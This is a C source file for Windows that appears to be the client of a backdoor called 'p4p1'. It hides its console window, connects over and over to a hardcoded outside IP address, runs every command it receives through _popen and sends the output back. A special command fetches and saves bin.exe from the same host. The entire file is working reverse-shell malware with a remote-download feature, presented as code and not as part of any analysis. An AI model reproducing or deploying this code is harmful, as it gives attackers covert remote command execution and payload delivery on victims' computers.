#include "p4p1-head.h"

int main(int argc, char * argv[])
{
	if(argc == 1)
		FreeConsole();

	int portno;
	char portchar[6];
	FILE * fp = fopen("p4p1_port.cfg", "r");
	
	if(fp == NULL){
		portno = 4441;
	} else {
		int i = 0;
		char c;
		while( (c = fgetc(fp)) != EOF){
			portchar[i] = c;
			i++;
		}
		portchar[i+1] = '\0';

		portno = atoi(portchar);
	}

	while(1){
		WSADATA wsa;
		if(WSAStartup(MAKEWORD(2, 2), &wsa) != NO_ERROR){
			fprintf(stderr, "Client : Error at wsastartup.\n");
		}

		/* socket */
		SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET){
			fprintf(stderr, "Client : socket() - Error at socket(): %i\n",
			WSAGetLastError());
			WSACleanup();
			return -1;
		}

		/*connect*/
		int cn;
		FILE *pPipe;
		int bytesSent;
		int bytesRecv;
		char buf[BUFSIZE] = "";
		char prompt[10] = "\n<p4p1 /> ";

		bytesSent = 0;
		bytesRecv = SOCKET_ERROR;
	
		struct sockaddr_in client;
		client.sin_family = AF_INET;
		client.sin_addr.s_addr = inet_addr(xstr(86.247.192.29));
		client.sin_port = htons(portno);

		/*pointers*/
		int * pbs = &bytesSent;
		int * pbr = &bytesRecv;

		
		do{
			cn = connect(s, (SOCKADDR*) &client, sizeof(client));
		} while( cn == SOCKET_ERROR);

		while(cn != SOCKET_ERROR){
			/*send & recv*/
			*pbs = send(s, prompt, sizeof(prompt), 0);
	                if(*pbs == SOCKET_ERROR) { //server disconnected!
	                        
	                        if(WSAGetLastError() != WSAECONNREFUSED
	                        || WSAGetLastError() == WSAECONNRESET){
					break;
	                        } else {
	                                printf("connection refused\n");
	                                return -1;
	                        }
	                }
			*pbr = SOCKET_ERROR;

			while(*pbr == SOCKET_ERROR){
				*pbr = recv(s, buf, BUFSIZE, 0);
				if(*pbr == 0 || *pbr == WSAECONNRESET){
					break;
				}

				if(bytesRecv < 0){
					return -1;
				} else {
					/*process received data*/
					if(iscommand(buf[0]) == 1 || iscommand(buf[0]) == 2){
						if(iscommand(buf[0]) == 2){	// custom p4p1 commadn
							memset(buf, 0, BUFSIZE);
							goto close;
						} else if (iscommand(buf[0]) == 1) {
							memset(buf, 0, BUFSIZE);
							download();
							strcpy(buf, "file downloaded from 86.247.192.29 / bin.exe\n");
						} else {
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "Command non recognized.\n");
						}

					} else {
						if( (pPipe = _popen( buf, "r" )) == NULL ){
							memset(buf, 0, BUFSIZE);
							strcpy(buf, "error in command");
							printf("error in cmd\n");
						} else {
							memset(buf, 0, BUFSIZE);
							int i = 0;
							char ch;
							while((ch = fgetc(pPipe)) != EOF){
								buf[i] = ch;
								i++;
							}
						}
					}
				}
			}		

			*pbs = send(s, buf, BUFSIZE, 0);
			if(*pbs == SOCKET_ERROR) { //server disconnected!
				if(WSAGetLastError() != WSAECONNREFUSED
				|| WSAGetLastError() == WSAECONNRESET){
					break;
				} else {
					printf("connection refused\n");
					return -1;
				}
			}
			*pbr = SOCKET_ERROR;
		}
		close:
		WSACleanup();
		_pclose(pPipe);
	}
	return 0;
}
